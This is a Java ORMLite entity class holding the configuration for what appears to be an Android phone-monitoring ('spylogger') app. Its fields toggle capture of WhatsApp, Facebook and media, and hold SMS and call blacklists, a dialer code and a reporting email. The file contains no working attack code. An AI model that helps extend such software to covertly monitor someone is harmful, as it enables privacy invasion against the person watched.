package com.gravatasufoca.spylogger.model;

import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import java.io.Serializable;

import lombok.Getter;
import lombok.Setter;

@DatabaseTable
@Getter
@Setter
public class Configuracao extends EntidadeAbstrata{
	private static final long serialVersionUID = -4679985146526783051L;

	public Configuracao() {
	}

	@Override
	public Serializable getId() {
		return _id;
	}

	@DatabaseField(generatedId=true)
	private Integer _id;
	@DatabaseField()
	private String dialer;
	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean miniatura;
	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean media;
	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean whatsApp;
	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean facebook;
	@DatabaseField(canBeNull=false,dataType=DataType.BOOLEAN)
	private boolean wifi;
	@DatabaseField
	private String smsBlacklist;
	@DatabaseField
	private String chamadasBlacklist;
	@DatabaseField
	private String email;
	@DatabaseField(canBeNull = true)
	private Integer idAparelho;
	@DatabaseField(canBeNull = false)
	private Integer intervalo;

}
